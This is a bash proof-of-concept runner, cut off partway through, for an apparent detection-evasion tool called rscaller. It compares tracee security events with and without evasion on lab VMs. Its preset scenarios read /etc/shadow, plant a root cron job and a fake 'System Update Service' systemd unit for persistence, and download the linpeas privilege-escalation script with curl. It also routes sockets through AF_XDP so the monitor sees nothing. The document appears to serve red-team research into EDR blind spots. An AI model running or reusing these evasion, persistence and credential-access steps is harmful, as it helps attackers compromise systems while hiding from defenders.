#!/usr/bin/env bash
# poc.sh — manual PoC CLI for rscaller mount namespace overlay profiles.
#
# Starts rsbeacon (and optionally tracee) on BEACON_VM, then runs a single
# command via `rsc exec` with the chosen mount profile on REMOTE.  Prints
# tracee events after the command exits so you can verify execution locality.
#
# Add --compare (or just --baseline-cmd) to also run a command directly on
# BEACON_VM (no rscaller involved) under its own tracee capture, so you get
# an apples-to-apples "with evasion" vs "without evasion" event count.
#
# Usage:
#   bash scripts/poc.sh [OPTIONS]
#
# Options:
#   --profile  <name>   Mount profile: none|recon|relay|shadow|ghost  (default: recon)
#   --cmd      <cmd>    Command to run inside rsc exec (evasion side)    (default: see profile)
#   --no-tracee         Skip tracee monitoring (faster startup)
#   --beacon   <host>   Beacon VM SSH alias                             (default: dev-vm-2)
#   --client   <host>   Client VM SSH alias                             (default: dev-vm-1)
#   --port     <port>   rsbeacon port                                   (default: 9999)
#   --dir      <path>   Remote rscaller dir                             (default: /home/ubuntu/rscaller)
#   --netstack <name>   rsbeacon --netstack: direct|smoltcp-xdp          (default: direct)
#   --xdp-iface <name>  rsbeacon --xdp-iface (required if --netstack smoltcp-xdp)
#   --xdp-queue <n>     rsbeacon --xdp-queue                             (default: 0)
#   --xdp-ip <addr>     rsbeacon --xdp-ip — smoltcp's own IPv4; must differ
#                       from the beacon's kernel IP (required if smoltcp-xdp)
#   --xdp-mtu <bytes>   rsbeacon --xdp-mtu — smoltcp has no PMTUD; required
#                       when a tunnel sits on the path (auto-detected for
#                       network-local via the kernel route cache)
#   --events   <list>   Comma-separated tracee --events to capture       (default: execve,execveat)
#   --query    <list>   Comma-separated substrings; only events whose
#                       processName/eventName/args match ANY of them are
#                       counted/shown                                    (default: none = show all)
#   --baseline-cmd <cmd> Command run directly (no rscaller) on BEACON_VM
#                       under its own tracee capture, for comparison
#   --compare           Shorthand: enable comparison; baseline defaults to
#                       --cmd verbatim if --baseline-cmd wasn't given
#   --cleanup-cmd <cmd> Best-effort cmd run on BEACON_VM and REMOTE after
#                       the test (e.g. remove a planted file)
#   --scenario <name>   Preset bundle of profile/cmd/baseline-cmd/events/
#                       query/cleanup-cmd: exec|file|network (see below).
#                       Any flag you also pass explicitly overrides the
#                       preset's value for that field.
#   -h, --help
#
# Profiles:
#   none   — no overlay, no forwarding; ip addr shows CLIENT addresses
#   recon  — /proc + /sys overlaid; grep /proc/net/fib_trie shows beacon IP
#   relay  — network syscalls forwarded through beacon; no filesystem overlay
#   shadow — full identity overlay (/proc + /sys + /etc) + network forwarding
#   ghost  — shadow + writable /mnt/target + process signal forwarding
#
# Scenarios (--scenario NAME), each is a --compare run:
#   exec     — cat /etc/shadow via ghost's /mnt/target FUSE anchor vs. cat
#              /etc/shadow directly on the beacon. Watches execve/execveat.
#   file     — plant a cron.d entry via the QEMU relay VM (raw write to the
#              beacon's disk from inside the guest, invisible to the beacon's
#              syscall trace) vs. writing straight to the beacon's live
#              /etc/cron.d. Watches execve/execveat +
#              security_file_open,magic_write, queries for "rscaller-poc"
#              (the filename — "cron" would match the cron daemon's routine
#              activity and flood the count).
#   network  — curl-download linpeas.sh via the relay profile (network
#              syscalls forwarded, traffic attributed to rsbeacon) vs.
#              curling it directly on the beacon. Watches
#              security_socket_connect,net_packet_dns, queries for "curl".
#   network-local — same as network, but client and beacon are the SAME VM:
#              curl runs on the beacon under seccomp-notify (no kmod needed),
#              rsbeacon on localhost serves the sockets via AF_XDP/smoltcp,
#              bypassing the kernel netstack — tracee is blind to both sides.
#   qemu     — plant a fake systemd unit (systemd-update.service + enable
#              symlink) on the beacon's scratch disk /dev/vdb through the QEMU
#              relay VM (device I/O inside the guest, invisible to the
#              beacon's syscall trace) vs. mounting /dev/vdb on the beacon and
#              writing directly. Watches execve/execveat +
#              security_file_open,magic_write, queries for "systemd-update".
#
# Examples:
#   bash scripts/poc.sh --profile recon
#   bash scripts/poc.sh --profile shadow --cmd hostname
#   bash scripts/poc.sh --profile none --no-tracee --cmd "ip -4 addr"
#   bash scripts/poc.sh --scenario exec
#   bash scripts/poc.sh --scenario file
#   bash scripts/poc.sh --scenario network
#   bash scripts/poc.sh --profile ghost --compare --query shadow \
#       --cmd "cat /mnt/target/etc/shadow" --baseline-cmd "cat /etc/shadow"

set -euo pipefail

BEACON_VM="${BEACON_VM:-dev-vm-2}"
REMOTE="${REMOTE:-dev-vm-1}"
BEACON_PORT="${BEACON_PORT:-9999}"
REMOTE_DIR="${REMOTE_DIR:-/home/ubuntu/rscaller}"
BEACON_BIN="${BEACON_BIN:-/home/ubuntu/rsbeacon}"
TRACEE_IMAGE="${TRACEE_IMAGE:-aquasec/tracee:latest}"
BECOME_PASS="${BECOME_PASS:-}"
MOUNT_BASE="/tmp/rsc-profiles"

PROFILE="recon"
CMD=""
NO_TRACEE=0
NETSTACK="${NETSTACK:-direct}"
XDP_IFACE="${XDP_IFACE:-}"
XDP_QUEUE="${XDP_QUEUE:-0}"
XDP_IP="${XDP_IP:-}"
TRACEE_EVENTS="execve,execveat"
QUERY=""
BASELINE_CMD=""
COMPARE=0
CLEANUP_CMD=""
SCENARIO=""
RSC_EXTRA_ARGS=""

# Track which fields the caller passed explicitly, so --scenario presets
# never clobber an explicit flag.
PROFILE_SET=0
CMD_SET=0
EVENTS_SET=0
QUERY_SET=0
BASELINE_CMD_SET=0
CLEANUP_CMD_SET=0
CLIENT_SET=0
BEACON_SET=0

bold=$'\e[1m'
dim=$'\e[2m'
green=$'\e[32m'
yellow=$'\e[33m'
red=$'\e[31m'
reset=$'\e[0m'

usage() {
	sed -n '/^# Usage:/,/^[^#]/{ /^#/{ s/^# \?//; p } }' "$0"
	exit 0
}

die() {
	echo "${red}error:${reset} $*" >&2
	exit 1
}
say() { echo "${bold}==>${reset} $*"; }
info() { echo "    $*"; }

# ── Arg parse ────────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
	case "$1" in
	--profile)
		PROFILE="$2"
		PROFILE_SET=1
		shift 2
		;;
	--cmd)
		CMD="$2"
		CMD_SET=1
		shift 2
		;;
	--no-tracee)
		NO_TRACEE=1
		shift
		;;
	--beacon)
		BEACON_VM="$2"
		BEACON_SET=1
		shift 2
		;;
	--client)
		REMOTE="$2"
		CLIENT_SET=1
		shift 2
		;;
	--port)
		BEACON_PORT="$2"
		shift 2
		;;
	--dir)
		REMOTE_DIR="$2"
		shift 2
		;;
	--netstack)
		NETSTACK="$2"
		shift 2
		;;
	--xdp-iface)
		XDP_IFACE="$2"
		shift 2
		;;
	--xdp-queue)
		XDP_QUEUE="$2"
		shift 2
		;;
	--xdp-ip)
		XDP_IP="$2"
		shift 2
		;;
	--xdp-mtu)
		XDP_MTU="$2"
		shift 2
		;;
	--events)
		TRACEE_EVENTS="$2"
		EVENTS_SET=1
		shift 2
		;;
	--query)
		QUERY="$2"
		QUERY_SET=1
		shift 2
		;;
	--baseline-cmd)
		BASELINE_CMD="$2"
		BASELINE_CMD_SET=1
		COMPARE=1
		shift 2
		;;
	--compare)
		COMPARE=1
		shift
		;;
	--cleanup-cmd)
		CLEANUP_CMD="$2"
		CLEANUP_CMD_SET=1
		shift 2
		;;
	--scenario)
		SCENARIO="$2"
		shift 2
		;;
	-h | --help) usage ;;
	*) die "Unknown option: $1" ;;
	esac
done

# ── Scenario presets (only fill fields not explicitly overridden) ───────────
if [[ -n "$SCENARIO" ]]; then
	case "$SCENARIO" in
	exec)
		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="ghost"
		[[ "$CMD_SET" -eq 1 ]] || CMD="cat /mnt/target/etc/shadow"
		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD="sudo cat /etc/shadow"
		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="execve,execveat"
		[[ "$QUERY_SET" -eq 1 ]] || QUERY="cat"
		COMPARE=1
		;;
	file)
		# Plant a cron.d entry: evasion side writes to the beacon's disk through
		# the QEMU relay VM (raw device I/O inside the guest, invisible to the
		# beacon's syscall trace); baseline writes straight to the beacon's live
		# /etc/cron.d — what an attacker without rscaller must do. Cleanup runs
		# right after the baseline capture stops (outside any tracee window) so
		# the beacon's cron daemon never opens the planted file during the
		# evasion window.
		# Query is the filename, NOT "cron" — that matches the cron daemon's
		# routine minute tick (PAM/ld.so noise) and floods the count.
		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="qemu-relay"
		[[ "$CMD_SET" -eq 1 ]] || CMD="sh -c 'mkdir -p /mnt/relay/etc/cron.d; echo \"* * * * * root /tmp/.rscaller-poc\" > /mnt/relay/etc/cron.d/rscaller-poc; sync; cat /mnt/relay/etc/cron.d/rscaller-poc'"
		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD='sudo sh -c '"'"'echo "* * * * * root /tmp/.rscaller-poc" > /etc/cron.d/rscaller-poc; sync; cat /etc/cron.d/rscaller-poc'"'"''
		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="execve,execveat,security_file_open,magic_write"
		[[ "$QUERY_SET" -eq 1 ]] || QUERY="rscaller-poc"
		[[ "$CLEANUP_CMD_SET" -eq 1 ]] || CLEANUP_CMD="rm -f /etc/cron.d/rscaller-poc"
		RSC_EXTRA_ARGS="--encryption none --relay-artifacts /var/lib/libvirt/images/rscaller-relay --relay-device /dev/vdb"
		COMPARE=1
		;;
	network)
		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="relay"
		LINPEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
		# curl -0 (HTTP/1.0): curl's default H2/happy-eyeballs pattern hangs
		# on teardown over the relay (known issue — keepalive-tail frames
		# never deliver a session EOF through the socket proxy). H1.0 is
		# close-delimited and completes cleanly; payload bytes are identical.
		[[ "$CMD_SET" -eq 1 ]] || CMD="curl -0 -fsSL --max-time 30 '$LINPEAS_URL' -o /tmp/linpeas.sh"
		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD="curl -0 -fsSL --max-time 30 '$LINPEAS_URL' -o /tmp/linpeas.sh"
		# Network events only, no execs. Query is the process name: baseline's
		# connections/DNS are attributed to curl; relay-forwarded traffic is
		# attributed to rsbeacon on the beacon, so it never matches.
		# net_packet_dns_request/response need --cgroupns=host (cgroup skb
		# hooks); plain net_packet_dns is not in tracee's default set.
		# net_packet_tcp intentionally excluded — one event per packet floods
		# the output during a download.
		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="security_socket_connect,net_packet_dns_request,net_packet_dns_response"
		[[ "$QUERY_SET" -eq 1 ]] || QUERY="curl"
		[[ "$CLEANUP_CMD_SET" -eq 1 ]] || CLEANUP_CMD="rm -f /tmp/linpeas.sh"
		COMPARE=1
		;;
	network-local)
		# Same-host variant of `network`: client and beacon are the same VM.
		# curl runs on the beacon under seccomp-notify (relay needs no kmod),
		# rsbeacon on localhost executes the sockets via AF_XDP/smoltcp,
		# bypassing the kernel netstack — tracee sees neither curl's sockets
		# (never executed in-kernel) nor rsbeacon's (XDP is below the skb hooks).
		[[ "$BEACON_SET" -eq 1 ]] || BEACON_VM="dev-vm-2"
		[[ "$CLIENT_SET" -eq 1 ]] || REMOTE="$BEACON_VM"
		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="relay"
		NETSTACK="smoltcp-xdp"
		if [[ -z "$XDP_IFACE" ]]; then
			XDP_IFACE=$(ssh "$BEACON_VM" "ip route show default | awk '{print \$5; exit}'" 2>/dev/null) ||
				die "could not auto-detect default iface on $BEACON_VM — pass --xdp-iface"
		fi
		# smoltcp's own address — must differ from the beacon's kernel IP
		# (see rsbeacon smoltcp_xdp::init) and be unused on the subnet.
		[[ -n "$XDP_IP" ]] || XDP_IP="192.168.122.250"
		if [[ "$PROFILE_SET" -eq 0 ]]; then
			# smoltcp can't reach the loopback stub resolver (127.0.0.53) —
			# overlay /etc/resolv.conf with the subnet gateway's resolver via
			# a host-bind mount in a generated profile variant of `relay`.
			# `options single-request` is REQUIRED: glibc otherwise fires the
			# A+AAAA queries with one sendmmsg() (not intercepted — seccomp
			# can't read the mmsghdr array out of tracee memory), writing two
			# datagrams back-to-back into the proxy's stream socketpair, where
			# datagram boundaries are lost. Serial queries keep one datagram
			# in flight per socketpair read.
			local_gw=$(ssh "$BEACON_VM" "ip route show default | awk '{print \$3; exit}'") ||
				die "could not detect default gateway on $BEACON_VM"
			ssh "$BEACON_VM" "printf 'nameserver %s\noptions single-request\n' '$local_gw' > /tmp/rsc-poc-resolv.conf"
			# Derive the generated profile from the REAL relay.yaml — a
			# hand-copied syscall list here rotted once already (missing
			# getsockname/getpeername/shutdown → local kernel answered
			# getsockname on the proxy pair with AF_UNIX → glibc
			# rfc3484_sort assert crash).
			scp -q "$(dirname "${BASH_SOURCE[0]}")/../rsc/profiles/relay.yaml" "$BEACON_VM:/tmp/rsc-poc-relay-local.yaml" ||
				die "could not copy relay.yaml to $BEACON_VM"
			ssh "$BEACON_VM" "python3 - <<'PYEOF'
import re
p = '/tmp/rsc-poc-relay-local.yaml'
s = open(p).read()
s = s.replace('name: relay', 'name: relay-local', 1)
s = s.replace('mounts: []', '''mounts:
  - remote: /tmp/rsc-poc-resolv.conf
    local: /etc/resolv.conf
    type: host''', 1)
open(p, 'w').write(s)
PYEOF"
			PROFILE="/tmp/rsc-poc-relay-local.yaml"
		fi
		# smoltcp has no PMTUD: learn the real path MTU from the kernel's
		# route cache (a jumbo DF ping forces an ICMP PTB, caching the
		# tunnel MTU) and hand it to rsbeacon via --xdp-mtu. Without this
		# every internet-bound full-size segment from --xdp-ip blackholes.
		if [[ -z "${XDP_MTU:-}" ]]; then
			for attempt in 1 2 3; do
				probe_ip=$(ssh "$BEACON_VM" "getent ahostsv4 github.com | head -1 | awk '{print \$1}'") || true
				if [[ -n "$probe_ip" ]]; then
					XDP_MTU=$(ssh "$BEACON_VM" "ping -M do -s 1450 -c 1 -W 3 '$probe_ip' >/dev/null 2>&1; \
						ip route show cache '$probe_ip' | grep -oE 'mtu [0-9]+' | awk '{print \$2; exit}'")
					[[ -n "$XDP_MTU" ]] && break
				fi
				info "path MTU probe attempt $attempt failed (probe_ip='${probe_ip:-}'), retrying"
				sleep 2
			done
			[[ -n "$XDP_MTU" ]] && info "auto-detected path MTU $XDP_MTU → --xdp-mtu"
		fi
		[[ -n "${XDP_MTU:-}" ]] || die "could not auto-detect path MTU on $BEACON_VM; pass --xdp-mtu"
		LINPEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
		# See the `network` scenario for why curl gets -0.
		[[ "$CMD_SET" -eq 1 ]] || CMD="curl -0 -fsSL --max-time 30 '$LINPEAS_URL' -o /tmp/linpeas.sh"
		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD="curl -0 -fsSL --max-time 30 '$LINPEAS_URL' -o /tmp/linpeas.sh"
		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="security_socket_connect,net_packet_dns_request,net_packet_dns_response"
		[[ "$QUERY_SET" -eq 1 ]] || QUERY="curl"
		[[ "$CLEANUP_CMD_SET" -eq 1 ]] || CLEANUP_CMD="rm -f /tmp/linpeas.sh"
		COMPARE=1
		;;
	qemu)
		# Plant a fake systemd unit (+ enable symlink) on the beacon's scratch
		# disk /dev/vdb: evasion side goes through the QEMU relay VM (raw device
		# I/O inside the guest, nothing on the beacon's syscall trace); baseline
		# mounts /dev/vdb on the beacon directly. vdb is throwaway ext4 — files
		# are overwritten each run; umount guard in case the baseline write
		# chain fails mid-way.
		UNIT='[Unit]\nDescription=System Update Service\nAfter=network-online.target\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/systemd-update --apply\n\n[Install]\nWantedBy=multi-user.target\n'
		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="qemu-relay"
		[[ "$CMD_SET" -eq 1 ]] || CMD="sh -c 'mkdir -p /mnt/relay/etc/systemd/system/multi-user.target.wants && printf \"$UNIT\" > /mnt/relay/etc/systemd/system/systemd-update.service && ln -sf ../systemd-update.service /mnt/relay/etc/systemd/system/multi-user.target.wants/systemd-update.service && sync && cat /mnt/relay/etc/systemd/system/systemd-update.service'"
		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD="sudo sh -c 'mount /dev/vdb /mnt && mkdir -p /mnt/etc/systemd/system/multi-user.target.wants && printf \"$UNIT\" > /mnt/etc/systemd/system/systemd-update.service && ln -sf ../systemd-update.service /mnt/etc/systemd/system/multi-user.target.wants/systemd-update.service && sync; umount /mnt'"
		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="execve,execveat,security_file_open,magic_write"
		[[ "$QUERY_SET" -eq 1 ]] || QUERY="systemd-update"
		[[ "$CLEANUP_CMD_SET" -eq 1 ]] || CLEANUP_CMD="umount /mnt"
		RSC_EXTRA_ARGS="--encryption none --relay-artifacts /var/lib/libvirt/images/rscaller-relay --relay-device /dev/vdb"
		COMPARE=1
		;;
	*)
		die "Unknown --scenario '$SCENARIO'. Valid: exec file network network-local qemu"
		;;
	esac
fi

# --compare with no explicit baseline: default to running --cmd verbatim.
if [[ "$COMPARE" -eq 1 && -z "$BASELINE_CMD" ]]; then
	BASELINE_CMD="$CMD"
fi

# Default command per profile (only when neither --cmd nor --scenario set one)
if [[ -z "$CMD" ]]; then
	case "$PROFILE" in
	none)
		CMD="ip -4 addr"
		;;
	recon)
		BEACON_IP=$(ssh "$BEACON_VM" "hostname -I | awk '{print \$1}'" 2>/dev/null || echo "")
		CMD="grep ${BEACON_IP:-192.168.122.180} /proc/net/fib_trie"
		;;
	relay)
		CMD="curl -s ifconfig.me"
		;;
	shadow | ghost)
		CMD="hostname"
		;;
	*)
		CMD="hostname"
		;;
	esac
fi

RSC="$REMOTE_DIR/target/release/rsc"
RSCLIENT="$REMOTE_DIR/target/release/rsclient"
# Path profiles (contain '/') name the mount after the file basename.
case "$PROFILE" in
*/*) NAME="prof-$(basename "$PROFILE" .yaml)" ;;
*) NAME="prof-$PROFILE" ;;
esac
MOUNT_POINT="$MOUNT_BASE/$NAME"

# ── Validate profile ─────────────────────────────────────────────────────────
case "$PROFILE" in
none | recon | relay | shadow | ghost | qemu-relay) ;;
*/*) ssh "$REMOTE" "test -f '$PROFILE'" || die "profile file '$PROFILE' not found on $REMOTE" ;;
*) die "Unknown profile '$PROFILE'. Valid: none recon relay shadow ghost qemu-relay, or a YAML path" ;;
esac

# ── qemu-relay prerequisites (fail fast with a clear message) ───────────────
if [[ "$PROFILE" == "qemu-relay" ]]; then
	ssh "$REMOTE" "virsh list --all >/dev/null 2>&1" ||
		die "libvirtd not reachable on $REMOTE — QEMU relay unavailable"
	ssh "$REMOTE" "ls /var/lib/libvirt/images/rscaller-relay/{vmlinuz,initrd.img,rootfs.img} >/dev/null 2>&1" ||
		die "relay boot artifacts missing on $REMOTE (run make deploy)"
	ssh "$BEACON_VM" "test -b /dev/vdb" ||
		die "/dev/vdb scratch disk missing on $BEACON_VM (virsh attach-disk, see AGENTS.md)"
fi

# ── Validate netstack ────────────────────────────────────────────────────────
case "$NETSTACK" in
direct) ;;
smoltcp-xdp)
	[[ -n "$XDP_IFACE" ]] || die "--netstack smoltcp-xdp requires --xdp-iface <interface>"
	# rsbeacon refuses a smoltcp address equal to the iface's kernel
	# address (shared-IP ARP hijack kills host networking), so an
	# explicit distinct --xdp-ip is effectively required.
	[[ -n "$XDP_IP" ]] || die "--netstack smoltcp-xdp requires --xdp-ip <unused subnet IP>"
	;;
*) die "Unknown --netstack '$NETSTACK'. Valid: direct smoltcp-xdp" ;;
esac
NETSTACK_ARGS="--netstack $NETSTACK"
if [[ "$NETSTACK" == "smoltcp-xdp" ]]; then
	NETSTACK_ARGS="$NETSTACK_ARGS --xdp-iface $XDP_IFACE --xdp-queue $XDP_QUEUE"
	[[ -n "$XDP_IP" ]] && NETSTACK_ARGS="$NETSTACK_ARGS --xdp-ip $XDP_IP"
	# smoltcp has no PMTUD — when a tunnel/overlay sits on the path
	# (lab DLP: MTU 1376) a 1500 MTU blackholes every full-size DF
	# segment. --xdp-mtu, or auto-detected per scenario below.
	[[ -n "${XDP_MTU:-}" ]] && NETSTACK_ARGS="$NETSTACK_ARGS --xdp-mtu $XDP_MTU"
fi

# ── Print plan ───────────────────────────────────────────────────────────────
echo ""
echo "${bold}rscaller PoC — mount namespace overlay${reset}"
echo "  client:   ${green}${REMOTE}${reset}"
echo "  beacon:   ${green}${BEACON_VM}:${BEACON_PORT}${reset}"
echo "  netstack: ${yellow}${NETSTACK}${reset}$([ "$NETSTACK" == "smoltcp-xdp" ] && echo " (iface=$XDP_IFACE queue=$XDP_QUEUE ip=$XDP_IP)")"
echo "  profile:  ${yellow}${PROFILE}${reset}"
echo "  command:  ${dim}${CMD}${reset}"
echo "  tracee:   $([ "$NO_TRACEE" -eq 1 ] && echo "disabled" || echo "enabled")"
[[ "$NO_TRACEE" -eq 0 ]] && echo "  events:   ${dim}${TRACEE_EVENTS}${reset}"
[[ -n "$QUERY" ]] && echo "  query:    ${dim}${QUERY}${reset}"
if [[ "$COMPARE" -eq 1 ]]; then
	echo "  compare:  ${dim}baseline-cmd=${BASELINE_CMD}${reset}"
fi
echo ""

# ── Tracee helpers (reused for baseline + evasion capture windows) ─────────
# start_tracee: launches tracee in a privileged container on BEACON_VM,
# sets TRACEE_PID / TRACEE_LOG / TRACEE_CONTAINER.
start_tracee() {
	TRACEE_LOG="/tmp/tracee-poc-$$-$RANDOM.log"
	TRACEE_CONTAINER="tracee-poc-$$-$RANDOM"

	if ! ssh "$BEACON_VM" "command -v docker >/dev/null 2>&1" 2>/dev/null; then
		die "docker not found on $BEACON_VM. Install docker or pass --no-tracee."
	fi

	say "starting tracee container on $BEACON_VM (image: $TRACEE_IMAGE)"
	ssh "$BEACON_VM" "
        nohup sudo docker run --rm --name '$TRACEE_CONTAINER' \
            --privileged --pid=host --cgroupns=host \
            -v /lib/modules:/lib/modules:ro \
            -v /usr/src:/usr/src:ro \
            -v /etc/os-release:/etc/os-release-host:ro \
            '$TRACEE_IMAGE' \
            --output json \
            --events '$TRACEE_EVENTS' \
            >'$TRACEE_LOG' 2>&1 &
        echo \$!
    " >/tmp/poc-tracee-pid-$$ 2>/dev/null || true
	TRACEE_PID=$(cat /tmp/poc-tracee-pid-$$ 2>/dev/null || echo "")
	rm -f /tmp/poc-tracee-pid-$$
	sleep 8 # tracee eBPF attach takes several seconds; 3s was losing baseline events
	if ! ssh "$BEACON_VM" "sudo docker ps --filter name='$TRACEE_CONTAINER' --format '{{.Names}}'" 2>/dev/null | grep -q .; then
		echo "${red}tracee container died during startup. Log:${reset}"
		ssh "$BEACON_VM" "cat '$TRACEE_LOG' 2>/dev/null" || true
		die "tracee not running on $BEACON_VM"
	fi
}

# stop_tracee_and_filter: kills tracee, prints matched events, sets
# LAST_EVENT_COUNT to how many survived the (optional) $QUERY filter.
stop_tracee_and_filter() {
	sleep 2 # let tracee flush captured events to the log before killing it
	if [[ -n "${TRACEE_CONTAINER:-}" ]]; then
		ssh "$BEACON_VM" "sudo docker kill '$TRACEE_CONTAINER' >/dev/null 2>&1 || true" 2>/dev/null
	elif [[ -n "${TRACEE_PID:-}" ]]; then
		ssh "$BEACON_VM" "sudo kill $TRACEE_PID 2>/dev/null || true" 2>/dev/null
	fi
	local out
	out=$(ssh "$BEACON_VM" "cat $TRACEE_LOG 2>/dev/null" |
		python3 -c "
import sys, json
# Noise filters. motd*: SSH-login MOTD helpers. rsbeacon/tokio-rt-worker
# (rsbeacon's main and thread names): the relay transport itself — with a
# working relay profile the payload sockets are serviced BY rsbeacon, so
# its syscalls are infrastructure, not payload activity (the demo claim:
# nothing attributed to the payload process).
motd = {'50-landscape-sy','50-motd-news','85-fwupd','90-updates-avai',
        'update-motd-fsc','update-motd-upd','landscape-sysinfo',
        'rsbeacon','tokio-rt-worker'}
query = [q.strip().lower() for q in '$QUERY'.split(',') if q.strip()]
found = 0
seen = {}
order = []
for line in sys.stdin:
    line = line.strip()
    if not line:
        continue
    try:
        e = json.loads(line)
    except Exception:
        continue
    if 'eventName' not in e:
        continue
    if e.get('processName','') in motd:
        continue
    haystack = json.dumps(e).lower()
    if query and not any(q in haystack for q in query):
        continue
    evt = e.get('eventName', e.get('syscall','?'))
    proc = e.get('processName','?')
    args = e.get('args') or []
    argv = next((a.get('value') for a in args
                 if isinstance(a, dict) and a.get('name') == 'argv'), None)
    if argv:
        cmdline = ' '.join(str(x) for x in argv)
    else:
        cmdline = str(next((a.get('value') for a in args
                            if isinstance(a, dict) and a.get('name') == 'pathname'), ''))
    if not cmdline:
        ra = next((a.get('value') for a in args
                   if isinstance(a, dict) and a.get('name') == 'remote_addr'), None)
        if isinstance(ra, dict):
            fam = ra.get('sa_family', '')
            if fam == 'AF_INET':
                cmdline = '%s:%s' % (ra.get('sin_addr', '?'), ra.get('sin_port', '?'))
            elif fam == 'AF_INET6':
                cmdline = '[%s]:%s' % (ra.get('sin6_addr', '?'), ra.get('sin6_port', '?'))
            else:
                cmdline = str(ra.get('sun_path', ra))
    # Skip unix-socket rows (cmdline = sun_path): local IPC (nscd etc.),
    # not network activity — outside this scenario's claim either way.
    if cmdline.startswith('/'):
        continue
    if not cmdline and evt.startswith('net_packet_dns'):
        md = next((a.get('value') for a in args
                   if isinstance(a, dict) and a.get('name') == 'metadata'), {}) or {}
        qs = next((a.get('value') for a in args
                   if isinstance(a, dict) and a.get('name') in ('dns_questions', 'dns_response')), []) or []
        names = [str(q.get('query') or q.get('name') or q.get('answer') or '')
                 for q in qs if isinstance(q, dict)]
        # Drop ephemeral ports so retries collapse into one deduped row.
        def ep(ip, port):
            p = str(port)
            return '%s:%s' % (ip, p) if p.isdigit() and int(p) < 1024 else str(ip)
        cmdline = ('%s -> %s %s' % (
            ep(md.get('src_ip', '?'), md.get('src_port', '?')),
            ep(md.get('dst_ip', '?'), md.get('dst_port', '?')),
            ','.join(n for n in names if n))).strip()
    if not cmdline:
        for a in args:
            if (isinstance(a, dict) and a.get('name') not in ('sockfd', 'type')
                    and a.get('value') not in (None, '', [])):
                cmdline = json.dumps(a['value'], default=str)[:100]
                break
    key = (evt, proc, cmdline)
    if key not in seen:
        seen[key] = 0
        order.append(key)
    seen[key] += 1
    found += 1
for evt, proc, cmdline in order[:50]:
    n = seen[(evt, proc, cmdline)]
    suffix = (' x%d' % n) if n > 1 else ''
    print(f'  {evt:<9} {proc:<14} {cmdline}{suffix}'[:160].rstrip())
if len(order) > 50:
    print(f'  ... {len(order) - 50} more unique, {found} total')
print(f'COUNT={found}')
" 2>/dev/null || echo "COUNT=0")
	LAST_EVENT_COUNT=$(echo "$out" | grep -o 'COUNT=[0-9]*' | tail -1 | cut -d= -f2)
	LAST_EVENT_COUNT="${LAST_EVENT_COUNT:-0}"
	echo "$out" | grep -v '^COUNT=' || true
	if [[ "$LAST_EVENT_COUNT" -eq 0 ]]; then
		echo "  (none matched${QUERY:+ query='$QUERY'})"
	fi
}

# run_remote <host> <cmd>: ssh to host and run cmd. If BECOME_PASS is set,
# pipe it to sudo -S so sudo-based commands run non-interactively.
run_remote() {
	local host="$1" cmd="$2"
	if [[ -n "$BECOME_PASS" ]]; then
		printf '%s\n' "$BECOME_PASS" | ssh "$host" "sudo -S -k $cmd"
	else
		ssh "$host" "$cmd"
	fi
}

# ── Step 1: Start rsbeacon ───────────────────────────────────────────────────
say "Starting rsbeacon on $BEACON_VM"
ssh "$BEACON_VM" "sudo pkill rsbeacon 2>/dev/null || true; sleep 0.3; \
    nohup sudo env RUST_LOG=${RUST_LOG:-rsbeacon=debug} $BEACON_BIN --listen 0.0.0.0:$BEACON_PORT $NETSTACK_ARGS >/tmp/rsbeacon-poc.log 2>&1 &"
sleep 1
if ! ssh "$BEACON_VM" "ss -tlnp | grep -q ':$BEACON_PORT'" 2>/dev/null; then
	echo "${red}rsbeacon failed to start. Log:${reset}"
	ssh "$BEACON_VM" "cat /tmp/rsbeacon-poc.log" 2>/dev/null || true
	die "rsbeacon not listening on :$BEACON_PORT"
fi
info "rsbeacon listening on :$BEACON_PORT"

# ── Step 1b: Baseline run (no rscaller) — only with --compare ───────────────
BASELINE_COUNT=""
if [[ "$COMPARE" -eq 1 && "$NO_TRACEE" -eq 0 ]]; then
	say "Baseline: running directly on $BEACON_VM (no rscaller)"
	info "command: $BASELINE_CMD"
	start_tracee
	set +e
	run_remote "$BEACON_VM" "$BASELINE_CMD" 2>&1 | head -n 8
	set -e
	echo ""
	say "Baseline tracee events"
	info "events: ${TRACEE_EVENTS}${QUERY:+   query: $QUERY}"
	stop_tracee_and_filter
	BASELINE_COUNT="$LAST_EVENT_COUNT"
	# Clean up the baseline artifact now — outside the capture window and
	# before the evasion run, so beacon services (e.g. cron) can't trip over
	# it mid-capture. Step 7 re-runs it best-effort at the end.
	if [[ -n "$CLEANUP_CMD" ]]; then
		info "cleanup (outside capture): $CLEANUP_CMD"
		run_remote "$BEACON_VM" "$CLEANUP_CMD" 2>/dev/null || true
	fi
	echo ""
elif [[ "$COMPARE" -eq 1 ]]; then
	info "--no-tracee set — skipping baseline capture (nothing to compare)"
fi

# ── Step 2: Start tracee for the evasion run (optional) ────────────────────
TRACEE_PID=""
if [[ "$NO_TRACEE" -eq 0 ]]; then
	say "Starting tracee on $BEACON_VM for evasion run (settle 8s)"
	start_tracee
	info "tracee running (pid ${TRACEE_PID:-unknown}) → $TRACEE_LOG"
fi

# ── Step 3: Clean up stale mounts ───────────────────────────────────────────
# Same-host runs (client == beacon) talk to rsbeacon over loopback.
if [[ "$REMOTE" == "$BEACON_VM" ]]; then
	BEACON_IP_SSH="127.0.0.1"
else
